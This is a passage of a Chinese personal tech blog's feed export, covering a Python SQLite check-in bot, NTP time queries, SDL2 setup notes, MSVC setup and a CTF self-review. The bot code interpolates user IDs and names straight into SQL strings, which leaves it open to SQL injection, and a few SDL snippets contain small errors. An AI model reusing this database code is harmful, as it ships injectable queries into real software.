LuckQuantity += <span class="number">1</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    Inauspicious += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">                self.cursor.execute(<span class="string">f&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">                        UPDATE UserLib</span></span><br><span class="line"><span class="string">                        SET DayQuantity = <span class="subst">&#123;DayQuantity&#125;</span>,</span></span><br><span class="line"><span class="string">                         Favorability = <span class="subst">&#123;Favorability&#125;</span>,</span></span><br><span class="line"><span class="string">                         LuckQuantity = <span class="subst">&#123;LuckQuantity&#125;</span>,</span></span><br><span class="line"><span class="string">                         Inauspicious = <span class="subst">&#123;Inauspicious&#125;</span>,</span></span><br><span class="line"><span class="string">                         LuckValue = <span class="subst">&#123;LuckValue&#125;</span>,</span></span><br><span class="line"><span class="string">                         Time = <span class="subst">&#123;Time&#125;</span></span></span><br><span class="line"><span class="string">                        WHERE UserID = &#x27;<span class="subst">&#123;ID&#125;</span>&#x27;;</span></span><br><span class="line"><span class="string">                                 &#x27;&#x27;&#x27;</span>)</span><br><span class="line">                <span class="comment"># 更新完了提交保存</span></span><br><span class="line">                self.conn.commit()</span><br><span class="line">                self.cursor.close()</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="comment"># &quot;已经签到过了 返回个False赶紧润&quot;</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">except</span> TypeError:</span><br><span class="line">            self.InIt(ID=ID, ImageName=ImageName)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">ChangeName</span>(<span class="params">self, ID, Name</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot; 修改名字的方法&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">        self.cursor.execute(<span class="string">f&#x27;&#x27;&#x27;SELECT * FROM UserLib WHERE UserId = &#x27;<span class="subst">&#123;ID&#125;</span>&#x27;;&#x27;&#x27;&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> self.cursor.fetchone() <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">        self.cursor.execute(<span class="string">f&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">                UPDATE UserLib</span></span><br><span class="line"><span class="string">                SET Username = &#x27;<span class="subst">&#123;Name&#125;</span>&#x27;</span></span><br><span class="line"><span class="string">                WHERE UserID = &#x27;<span class="subst">&#123;ID&#125;</span>&#x27;;</span></span><br><span class="line"><span class="string">                         &#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        self.conn.commit()</span><br><span class="line">        self.conn.close()</span><br><span class="line">        <span class="comment"># 究竟哪种断开才对呢。。。</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">UserInfoImage</span>(<span class="params">self, ID</span>):</span><br><span class="line"></span><br><span class="line">        self.cursor.execute(</span><br><span class="line">            <span class="string">f&#x27;&#x27;&#x27;SELECT Username, DayQuantity, Favorability, LuckQuantity,</span></span><br><span class="line"><span class="string">             Inauspicious, LuckValue FROM UserLib WHERE UserId = &#x27;<span class="subst">&#123;ID&#125;</span>&#x27;;&#x27;&#x27;&#x27;</span>)</span><br><span class="line">        Username, DayQuantity, Favorability, LuckQuantity, Inauspicious, LuckValue = self.cursor.fetchone()</span><br><span class="line">        self.cursor.close()</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">await</span> TextImage(UserName=Username, DayQuantity=DayQuantity, Favorability=Favorability,</span><br><span class="line">                           LuckQuantity=LuckQuantity, LuckValue=LuckValue, Inauspicious=Inauspicious, ID=ID):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>Sqlite</tag>
      </tags>
  </entry>
  <entry>
    <title>Ntp服务的使用</title>
    <url>/2023/11/29/2023-11-29-Ntp%E6%9C%8D%E5%8A%A1%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<h3 id="什么是NTP服务"><a href="#什么是NTP服务" class="headerlink" title="什么是NTP服务"></a>什么是NTP服务</h3><p>使用之前我们先了解一下。</p>
<p>  <a href="https://baike.baidu.com/item/NTP/1100433?fromModule=lemma_inlink">NTP</a>服务器【[Network Time Protocol](https:&#x2F;&#x2F;baike.baidu.com&#x2F;item&#x2F;Network Time Protocol&#x2F;2985649?fromModule&#x3D;lemma_inlink)（NTP）】是用来使计算机时间同步化的一种协议，它可以使<a href="https://baike.baidu.com/item/%E8%AE%A1%E7%AE%97%E6%9C%BA/140338?fromModule=lemma_inlink">计算机</a>对其服务器或<a href="https://baike.baidu.com/item/%E6%97%B6%E9%92%9F%E6%BA%90/3219811?fromModule=lemma_inlink">时钟源</a>（如<a href="https://baike.baidu.com/item/%E7%9F%B3%E8%8B%B1%E9%92%9F/1809648?fromModule=lemma_inlink">石英钟</a>，<a href="https://baike.baidu.com/item/GPS/214654?fromModule=lemma_inlink">GPS</a>等等），做同步化，它可以提供高精准度的时间校正（LAN上与标准间差小于1毫秒，<a href="https://baike.baidu.com/item/WAN/297040?fromModule=lemma_inlink">WAN</a>上几十毫秒），且可介由加密确认的方式来防止恶毒的协议攻击。时间按NTP服务器的等级传播。按照离外部UTC源的远近把所有服务器归入不同的Stratum（层）中。</p>
<p>​																				——百度百科</p>
<p>  上文说的很复杂，但简单来说就是获取时间的一种方式。</p>
<p>  在需要时间数据时，我们有系统时间和外部时间两种方式来获取。但是呢，使用时可能遇到一些情况。例如系统时间设置的不正确，从而会导致出现误差。虽然说一般系统时间也是根据NTP服务器来获取的，但我们无法保证系统的NTP服务器是否正常工作，所以我们可以考虑直接使用NTP服务器来获取正确的时间。</p>
<p>  这也是我自己的想法，国家授时中心，以及腾讯云、阿里云，这类一线大厂，它们提供的NTP服务具有稳定性。经过本人验证，企业的NTP服务是比授时中心快一些的。话不多说，直接上手吧。</p>
<h4 id="使用NTP"><a href="#使用NTP" class="headerlink" title="使用NTP"></a>使用NTP</h4><p>以下的代码就是我本人使用NTP服务器的例子，根据我的需求我只需要年月日这个时间。</p>
<p>图片（暂时没有稳定图床）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">NtpTime</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot; 通过Ntp服务器返回时间 &quot;&quot;&quot;</span></span><br><span class="line">    MD = <span class="literal">True</span></span><br><span class="line">    num = <span class="number">1</span></span><br><span class="line">    ntpurl = <span class="string">f&#x27;ntp<span class="subst">&#123;num&#125;</span>&#x27;</span></span><br><span class="line">    <span class="keyword">while</span> MD:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            ntp_server = <span class="string">f&quot;<span class="subst">&#123;ntpurl&#125;</span>.aliyun.com&quot;</span></span><br><span class="line">            <span class="comment"># 创建NTP客户端</span></span><br><span class="line">            client = ntplib.NTPClient()</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 发送NTP请求并获取时间信息</span></span><br><span class="line">            response = client.request(ntp_server)</span><br><span class="line">            MD = <span class="literal">False</span></span><br><span class="line">            timestamp = response.tx_time</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 将时间戳转换为日期时间格式</span></span><br><span class="line"></span><br><span class="line">            local_time = time.localtime(timestamp)</span><br><span class="line">            formatted_time = time.strftime(<span class="string">&quot;%Y,%m,%d&quot;</span>, local_time)</span><br><span class="line">            Year, Mouth, Day = formatted_time.split(<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line"></span><br><span class="line">            Year, Mouth, Day = <span class="built_in">map</span>(<span class="built_in">int</span>, [Year, Mouth, Day])</span><br><span class="line">            <span class="comment"># 定义两个日期</span></span><br><span class="line"></span><br><span class="line">            date1 = datetime.date(Year, Mouth, Day)</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">str</span>(date1)</span><br><span class="line">        <span class="keyword">except</span> ntplib.NTPException:</span><br><span class="line">            num += <span class="number">1</span></span><br></pre></td></tr></table></figure>

<h4 id="使用NTP的缺点"><a href="#使用NTP的缺点" class="headerlink" title="使用NTP的缺点"></a>使用NTP的缺点</h4><p>毕竟我们通过访问NTP得到时间这一过程也需要耗时的，所以我们无法得到一个更精准的时间。</p>
<p>除非我们能估算代码的运行速度，提前加上，才能确保时间足够精准。</p>
]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>NTP</tag>
      </tags>
  </entry>
  <entry>
    <title>2024-3-13-开发SDL2的常见问题</title>
    <url>/2024/03/13/2024-3-13-%E5%BC%80%E5%8F%91SDL2%E7%9A%84%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98/</url>
    <content><![CDATA[<h3 id="使用Code-block开发SDL2的常见问题"><a href="#使用Code-block开发SDL2的常见问题" class="headerlink" title="使用Code::block开发SDL2的常见问题"></a>使用Code::block开发SDL2的常见问题</h3><p>由于网上关于Code::block 和 SDL2的中文教程比较少，也为了巩固我的经验所以编写了这篇博客。</p>
<h4 id="第一个问题-找不到头文件"><a href="#第一个问题-找不到头文件" class="headerlink" title="第一个问题 找不到头文件"></a>第一个问题 找不到头文件</h4><p><img src="/img/images/csdl2tu4.png" alt="img"></p>
<p>这是因为没有设置搜索路径</p>
<p>打开编译器设置 &gt; 搜索路径设置</p>
<p><img src="/img/images/csdl2tu3.png" alt="img"></p>
<p>把搜索路径添加进去后编译器才会知道从哪里找头文件</p>
<p>当然链接器的搜索路径也要添加哦，两个需要添加的内容是一样的</p>
<h4 id="第二个问题-SDL2RTSGame-init-cpp-42-undefined-reference-to-IMG-Init’"><a href="#第二个问题-SDL2RTSGame-init-cpp-42-undefined-reference-to-IMG-Init’" class="headerlink" title="第二个问题 \SDL2RTSGame\init.cpp|42|undefined reference to &#96;IMG_Init’|"></a>第二个问题 \SDL2RTSGame\init.cpp|42|undefined reference to &#96;IMG_Init’|</h4><p><img src="/img/images/csdl2tu5.png" alt="img"></p>
<p>实际上是没有添加链接库</p>
<p>这里有个陷阱，这里支持的文件格式里并没有dll文件，实际上dll文件是属于<strong>动态链接库</strong>的。但很容易让没有经验的小白误以为dll不是，然后去尝试很多 <code>.a</code>之类的文件，都不行。</p>
<p><img src="/img/images/csdl2tu6.png" alt="img"></p>
<p>在这里需要勾选所有，然后将dll文件添加进去就可以了。</p>
<p><img src="/img/images/csdl2tu7.png" alt="img"></p>
]]></content>
      <categories>
        <category>C++</category>
      </categories>
      <tags>
        <tag>C++</tag>
        <tag>Code::Block</tag>
        <tag>SDL2</tag>
      </tags>
  </entry>
  <entry>
    <title>2024-3-16-SDL2loadSurface</title>
    <url>/2024/03/16/2024-3-16-SDL2loadSurface/</url>
    <content><![CDATA[<h3 id="loadSurface"><a href="#loadSurface" class="headerlink" title="loadSurface"></a>loadSurface</h3><p>这是SDL2作者的官方demo中所制作出的一个函数，具体如下：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">SDL_Surface* <span class="title">loadSurface</span><span class="params">( std::string path )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 两个指针变量</span></span><br><span class="line"></span><br><span class="line">	SDL_Surface* optimizedSurface = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	SDL_Surface* loadedSurface = <span class="built_in">IMG_Load</span>( path.<span class="built_in">c_str</span>() );</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>( loadedSurface == <span class="literal">NULL</span> )<span class="comment">// 如果 IMG_Load读取失败则返回空 以此抛出错误</span></span><br><span class="line">	&#123;</span><br><span class="line">		std::cout &lt;&lt; <span class="string">&quot;Unable to load image %s! SDL_image Error: &quot;</span> &lt;&lt; path.<span class="built_in">c_str</span>() &lt;&lt; <span class="built_in">IMG_GetError</span>() &lt;&lt; std::endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//Convert surface to screen format</span></span><br><span class="line"></span><br><span class="line">		optimizedSurface = <span class="built_in">SDL_ConvertSurface</span>( loadedSurface, gScreenSurface-&gt;format, <span class="number">0</span> );</span><br><span class="line">        <span class="comment">// 使用SDL_ConvertSurface处理</span></span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>( optimizedSurface == <span class="literal">NULL</span> )</span><br><span class="line">		&#123;</span><br><span class="line">			std::cout &lt;&lt; <span class="string">&quot;Unable to optimize image %s! SDL Error: &quot;</span> &lt;&lt; path.<span class="built_in">c_str</span>() &lt;&lt; <span class="built_in">SDL_GetError</span>() &lt;&lt; std::endl;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">//Get rid of old loaded surface</span></span><br><span class="line">		<span class="built_in">SDL_FreeSurface</span>( loadedSurface );</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> optimizedSurface;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这个函数十分简单，主要进行的操作就是两步</p>
<p>第一步，loadedSurface读取图像</p>
<p><code>SDL_Surface* loadedSurface = IMG_Load( path.c_str() );</code></p>
<p>第二步，SDL_ConvertSurface将图像输出到表面。</p>
<p><code>optimizedSurface = SDL_ConvertSurface( loadedSurface, gScreenSurface-&gt;format, 0 );</code></p>
]]></content>
      <categories>
        <category>C++</category>
      </categories>
      <tags>
        <tag>C++</tag>
        <tag>SDL2</tag>
      </tags>
  </entry>
  <entry>
    <title>2024-3-20-SDL2开发一</title>
    <url>/2024/03/20/2024-3-20-SDL2%E5%BC%80%E5%8F%91%E4%B8%80/</url>
    <content><![CDATA[<p>SDL2步骤</p>
<ol>
<li>要做的第一件事，先初始化，调用 SDL_Init()方法<ul>
<li>如果不初始化的话，一些方法在后续是无法起作用的。</li>
<li>例如 未初始化 <code>SDL_AUDIO</code>就无法使用<code>SDL_AUDIO.h</code>内包含的方法</li>
</ul>
</li>
</ol>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//我的初始化例子</span></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">init</span><span class="params">()</span><span class="comment">// 初始化</span></span></span><br><span class="line"><span class="function">	<span class="comment">//Initialization flag</span></span></span><br><span class="line"><span class="function">	<span class="type">bool</span> success </span>= <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//Initialize SDL</span></span><br><span class="line">	<span class="keyword">if</span>( <span class="built_in">SDL_Init</span>( SDL_INIT_EVERYTHING ) &lt; <span class="number">0</span> )<span class="comment">// 初始化全部系统</span></span><br><span class="line">	&#123;</span><br><span class="line">		std::cout &lt;&lt; <span class="string">&quot;SDL could not initialize! SDL Error: &quot;</span> &lt;&lt; <span class="built_in">SDL_GetError</span>() &lt;&lt; std::endl;</span><br><span class="line">		success = <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">       ...... <span class="comment">// 这里编写成功后的代码</span></span><br><span class="line">        </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>这段初始化代码使用了<code>SDL_INIT_EVERYTHING</code>常量，意思是初始化全部的系统。</p>
<p>如果没有成功初始化会打印出错误来。</p>
<ol start="2">
<li>要做的第二件事 创建屏幕 使用<code>SDL_CreateWindow()</code>方法即可</li>
</ol>
<p>但是在此之前我们需要定义几个变量</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//The window we&#x27;ll be rendering to</span></span><br><span class="line">SDL_Window* gWindow = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//The surface contained by the window</span></span><br><span class="line">SDL_Surface* gScreenSurface = <span class="literal">NULL</span>;</span><br></pre></td></tr></table></figure>

<p>以上定义了一个窗口指针和一个曲面指针，这在我们后续会用到的。</p>
<p>然后定义两个常量</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="type">const</span> <span class="type">int</span> SCREEN_WIDTH = <span class="number">1920</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> SCREEN_HEIGHT = <span class="number">1080</span>;</span><br></pre></td></tr></table></figure>

<p>也就是我们窗口的长和宽了。</p>
<p>然后如何使用<code>SDL_Createwindow()</code>呢</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">extern</span> DECLSPEC SDL_Window * SDLCALL <span class="title">SDL_CreateWindow</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *title,</span></span></span><br><span class="line"><span class="params"><span class="function">                                                      <span class="type">int</span> x, <span class="type">int</span> y, <span class="type">int</span> w,</span></span></span><br><span class="line"><span class="params"><span class="function">                                                      <span class="type">int</span> h, Uint32 flags)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Create an SDL window from an existing native window.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * In some cases (e.g. OpenGL) and on some platforms (e.g. Microsoft Windows)</span></span><br><span class="line"><span class="comment"> * the hint `SDL_HINT_VIDEO_WINDOW_SHARE_PIXEL_FORMAT` needs to be configured</span></span><br><span class="line"><span class="comment"> * before using SDL_CreateWindowFrom().</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * \param data a pointer to driver-dependent window creation data, typically</span></span><br><span class="line"><span class="comment"> *             your native window cast to a void*</span></span><br><span class="line"><span class="comment"> * \returns the window that was created or NULL on failure; call</span></span><br><span class="line"><span class="comment"> *          SDL_GetError() for more information.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * \since This function is available since SDL 2.0.0.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * \sa SDL_CreateWindow</span></span><br><span class="line"><span class="comment"> * \sa SDL_DestroyWindow</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure>

<p>我们可以看到它默认接受6个参数</p>
<ol>
<li>第1个是标题，字符串类型的</li>
<li>第2，3个是坐标，这个坐标是相对于屏幕的坐标，就是一屏幕左上角为0，0开始</li>
<li>第4，5，个很显然是width和height的缩写</li>
<li>第6个，flag标志位，则是填写一些SDL定义好的常量了</li>
</ol>
<p>示例</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">gWindow = <span class="built_in">SDL_CreateWindow</span>( <span class="string">&quot;SDL Tutorial&quot;</span>, SDL_WINDOWPOS_UNDEFINED, SDL_WINDOWPOS_UNDEFINED, SCREEN_WIDTH, SCREEN_HEIGHT, SDL_WINDOW_FULLSCREEN );</span><br></pre></td></tr></table></figure>

<p>示例中的代码我们使用了一个特殊的常量：<code> SDL_WINDOWPOS_UNDEFINED</code></p>
<ul>
<li>表示将窗口的位置设置为不确定，这意味着窗口将被放置在一个由操作系统确定的默认位置。这通常用于在创建窗口时指定窗口的初始位置。</li>
</ul>
<ol start="3">
<li>要做的第三件事：构建事件循环</li>
</ol>
<p>如果不去构建事件循环，我们将无法直接和我们的程序交互。所以我们需要构建一个用来监听事件的事件循环。</p>
<p>示例：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="type">bool</span> quit = <span class="literal">false</span>;</span><br><span class="line">SDL_Event e;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">			<span class="comment">//While application is running</span></span><br><span class="line"></span><br><span class="line">			<span class="keyword">while</span>( !quit )</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="comment">//Handle events on queue</span></span><br><span class="line">				<span class="keyword">while</span>( <span class="built_in">SDL_PollEvent</span>( &amp;e ) != <span class="number">0</span> )</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="comment">//User requests quit</span></span><br><span class="line">					<span class="keyword">if</span>( e.type == SDL_QUIT )</span><br><span class="line">					&#123;</span><br><span class="line">						quit = <span class="literal">true</span>;</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">            &#125;   </span><br></pre></td></tr></table></figure>

<p>这段代码里我们首先声明了和<code>bool </code>类型的变量<code>quit</code>和<code>SDL_Event</code>类型的变量<code>e</code>.</p>
<p>quit 用来判断是否退出，如果退出则终止循环。</p>
<p>写成<code>!quit </code>也是为了便于理解，相当于如果<code>quit</code>为<code>true</code>的时候，则主循环终止。</p>
<p>重要的事情有三点：</p>
<ul>
<li><p><code>SDL_PollEvent()</code>是 SDL 库中用于轮询事件队列的函数。</p>
</li>
<li><p>当调用 <code>SDL_PollEvent()</code> 函数时，它会检查当前事件队列中是否有任何待处理的事件。如果有事件在队列中，它将从队列中取出一个事件，并将其存储在传入的 <code>SDL_Event</code> 结构体中。然后你可以根据事件的类型和内容来做出相应的处理。</p>
</li>
<li><p><code>SDL_PollEvent()</code> 是一个非阻塞函数，即如果没有事件发生，它会立即返回，不会阻塞程序的执行。</p>
</li>
</ul>
<p>也就是说，内层循环中，<code>SDL_PollEvent()</code>即使一直被反复执行，也不会发生阻塞，但其一直反复的等待事件发生，以便做出相应的处理。</p>
]]></content>
      <categories>
        <category>C++</category>
      </categories>
      <tags>
        <tag>C++</tag>
        <tag>SDL2</tag>
      </tags>
  </entry>
  <entry>
    <title>2024-3-20-SDL2开发二</title>
    <url>/2024/03/20/2024-3-20-SDL2%E5%BC%80%E5%8F%91%E4%BA%8C/</url>
    <content><![CDATA[<h3 id="aaa"><a href="#aaa" class="headerlink" title="aaa"></a>aaa</h3><p>上一篇讲了SDL2项目首先要做的三件事，以及一些基础函数。</p>
<p>这篇接着搞没讲完的</p>
<ol start="4">
<li><p>第四件事，优化代码</p>
<p>添加<code>SDL_FreeSurface(gPNGSurface);</code>释放资源</p>
</li>
</ol>
<p>​	添加<code>SDL_UpdateWindowSurface( gWindow );</code>刷新屏幕</p>
<p>​	添加<code>close();</code>关闭SDL2记得return 0;</p>
<p>​	（待补充）</p>
<ol start="5">
<li>第五件事 先会用SDL 1.0版本的 Surface  SDL_Render系列，但是我现在懒得写，</li>
</ol>
<p>示例</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">gSurface = <span class="built_in">SDL_GetWindowSurface</span>(gWindows);</span><br></pre></td></tr></table></figure>

<p>要使用先初始化，但是一旦初始化了Surface，gwindow就不可以用来初始化别的了。</p>
<ol start="6">
<li>第六件事，纹理和渲染器，SDL 2.0版本降临</li>
</ol>
<p>Surface  和 Texture 的区别：</p>
<p>​	Surface  使用CPU进行处理，存在于内存</p>
<p>​	Texture使用GPU处理，背后使用了OpenGL和Direct3D接口，让游戏更流畅更快。</p>
<p>Render可以渲染Texture</p>
<p>创建渲染器：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">SDL_Renderer* renderer = <span class="built_in">SDL_CreateRenderer</span>(gWindow, <span class="number">-1</span>, SDL_RENDERER_SOFTWARE);</span><br></pre></td></tr></table></figure>

<p>其中<code>SDL_RENDERER_SOFTWARE</code>代表使用软件加速，-1代表使用第一块显卡，而<code>SDL_CreateRenderer</code>必须要接受3个参数。</p>
<p>ps: 除此之外的其他常量还有<code>SDL_RENDERER_ACCELERATED</code>代表硬件加速，实际上就是2，而是软件加速是1</p>
<p>读取图像：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">SDL_Surface* loadedSurface = <span class="built_in">IMG_Load</span>( path.<span class="built_in">c_str</span>() );</span><br></pre></td></tr></table></figure>

<p>然后转换</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">SDL_CreateTextureFromSurface</span>(loadedSurface);</span><br></pre></td></tr></table></figure>



<hr>
<p>常见问题三</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">||=== 构建: Debug 在 demo04 中 (编译器: GNU GCC Compiler) ===|</span><br><span class="line">main.cpp||In function <span class="string">&#x27;int SDL_main(int, char**)&#x27;</span>:|</span><br><span class="line">main.cpp|<span class="number">135</span>|error: cannot convert <span class="string">&#x27;SDL_Surface*&#x27;</span> to <span class="string">&#x27;SDL_Texture*&#x27;</span>|</span><br><span class="line">SDL2\SDL_render.h|<span class="number">1410</span>|note:   initializing argument <span class="number">2</span> of <span class="string">&#x27;int SDL_RenderCopy(SDL_Renderer*, SDL_Texture*, const SDL_Rect*, const SDL_Rect*)&#x27;</span>|</span><br><span class="line">||=== 构建 结束: <span class="number">1</span> 错误, <span class="number">0</span> 警告 (<span class="number">0</span> 分, <span class="number">0</span> 秒) ===|</span><br></pre></td></tr></table></figure>

<p>接收类型不正确？</p>
<p>排查了半天是头文件里的声明忘了</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">extern</span> SDL_Texture* gPNGSurface; </span><br></pre></td></tr></table></figure>

<p>在检查全局变量类型时，是按照头文件的传输类型来检查的。</p>
<hr>
<p><code>SDL_Rect</code>结构体</p>
<ul>
<li><p><code>SDL_Rect</code>结构体是Simple DirectMedia Layer (SDL)  中用于表示矩形区域的数据结构。它通常用于游戏开发和图形处理中。<code>SDL_Rect </code>结构体包含四个整数成员，分别表示矩形区域的左上角的 x 和 y  坐标，以及矩形的宽度和高度。通过<code>SDL_Rect</code>结构体，开发人员可以方便地定义、操作和管理矩形区域，用于绘制图形、碰撞检测等功能。</p>
<ul>
<li>也就是说，如果截取到了角落的部分则会被拉伸</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>C++</category>
      </categories>
      <tags>
        <tag>C++</tag>
        <tag>SDL2</tag>
      </tags>
  </entry>
  <entry>
    <title>2024-3-20-SDL2开发三</title>
    <url>/2024/03/20/2024-3-20-SDL2%E5%BC%80%E5%8F%91%E4%B8%89/</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>2024-6-22-入坑MSVC</title>
    <url>/2024/06/22/2024-6-22-%E5%85%A5%E5%9D%91MSVC/</url>
    <content><![CDATA[<h1 id="入坑原因"><a href="#入坑原因" class="headerlink" title="入坑原因"></a>入坑原因</h1><p>  挺简单的，不想用MINGW了</p>
<p>  之前一直用的MINGW + CODE::BLOCK 的组合，现在想试试vscode。我理所当然的安装了MINGW，然后vscode推荐我使用MSVC，我主打一个听劝，直接搜教程开搞。</p>
<p>  不过在看教程的过程中，发现网上教程大部分都有些过时，时效性太低，以至于我实际使用的时候遇到一些问题。</p>
<p>  撰写此文，为了加深自己记忆，也为了创作一篇更适合现在环境安装教程。</p>
<h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>步骤一</p>
<ul>
<li><p>安装vscode</p>
</li>
<li><p>vscode中安装c++插件</p>
</li>
<li><p><img src="/img/images/1d9c9069-b3de-4f87-b5e0-274cd8d8781d.png" alt="img"></p>
</li>
<li><p>安装这仨就行了然后会弹出一个叫做C++开发入门的东西</p>
</li>
<li><p><img src="/img/images/66be628a-0215-4e85-9039-407bba3d55c2.png" alt="img"></p>
</li>
<li><p>跟着步骤走</p>
</li>
<li><p>进行第一步时会有问题</p>
</li>
<li><p><img src="/img/images/c8ff57e6-984b-4ba4-b501-e425a4bcc7e1.png" alt="img"></p>
</li>
<li><p>要弄msvc，当然是要用cl编译器了</p>
</li>
<li><p>所以我们得安装</p>
</li>
<li><p>好困不写了</p>
</li>
</ul>
]]></content>
      <tags>
        <tag>C++</tag>
        <tag>Windows</tag>
      </tags>
  </entry>
  <entry>
    <title>2024-8-24-寨板X99Bios</title>
    <url>/2024/08/24/2024-8-24-%E5%AF%A8%E6%9D%BFX99Bios/</url>
    <content><![CDATA[<p>忘了要写啥了</p>
<p>我记得是</p>
<p>X99的需要特殊的BIOS固件才能当好服务器</p>
<p>否则无法在无显卡的情况下进入系统</p>
<p>我需要绕过他的自检</p>
<p>后面没研究了开学了</p>
<p>目前是加了个铝热亮机卡。。</p>
<p>哎</p>
<p>白白多耗电</p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>OS</tag>
        <tag>硬件</tag>
      </tags>
  </entry>
  <entry>
    <title>2024-9-15-test</title>
    <url>/2024/09/15/2024-9-15-test/</url>
    <content><![CDATA[<h1 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h1><p>因为很久没有更新blog了，我需要发送一条测试blog</p>
]]></content>
      <tags>
        <tag>-hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>2024-11-17-自我反思</title>
    <url>/2024/11/17/2024-11-17-%E8%87%AA%E6%88%91%E5%8F%8D%E6%80%9D/</url>
    <content><![CDATA[<h1 id="自我反思"><a href="#自我反思" class="headerlink" title="自我反思"></a>自我反思</h1><p>目前在做的CTF方向</p>
<p>主要方向</p>
<p>​	第一 逆向</p>
<p>​	第二 WEB</p>
<p>​	第三 杂项</p>
<p>​	第四 密码</p>
<p>我要细数我在每个方向中的不足之处。</p>
<ol>
<li><p>逆向</p>
<ul>
<li><p>当前情况：</p>
<ul>
<li>做 二进制 可执行文件逆向时，主用ida pro</li>
<li>做 android逆向主用 mt</li>
<li>做jar逆向，则用idea</li>
<li>pyc逆向 可直接反编译</li>
<li>js逆向 无需反编译</li>
<li>o 文件逆向</li>
</ul>
<p>目前也就做过这些</p>
<p>太少！</p>
<p>太窄！</p>
</li>
<li><p>能力方面：</p>
</li>
<li><p>需要什么：</p>
<ul>
<li>伪C</li>
<li>x86汇编</li>
<li>smali汇编</li>
